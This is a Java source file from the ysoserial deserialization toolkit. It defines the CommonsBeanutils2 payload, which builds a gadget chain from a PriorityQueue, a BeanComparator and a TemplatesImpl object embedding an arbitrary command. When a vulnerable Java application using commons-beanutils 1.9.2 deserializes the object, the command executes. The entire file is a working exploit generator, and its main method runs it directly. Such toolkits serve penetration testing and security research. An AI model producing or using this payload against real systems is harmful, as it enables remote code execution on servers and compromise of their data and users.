package ysoserial.payloads;


import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.lang.reflect.Constructor;
import java.util.Comparator;
import java.util.PriorityQueue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
public class CommonsBeanutils2 implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);

        Constructor constructor = Reflections.getFirstCtor("java.util.Collections$ReverseComparator");
        Reflections.setAccessible(constructor);
        Comparator obj = (Comparator) constructor.newInstance();

        final BeanComparator comparator = new BeanComparator(null, obj);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});

        return queue;
    }


    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils2.class, args);
    }
}
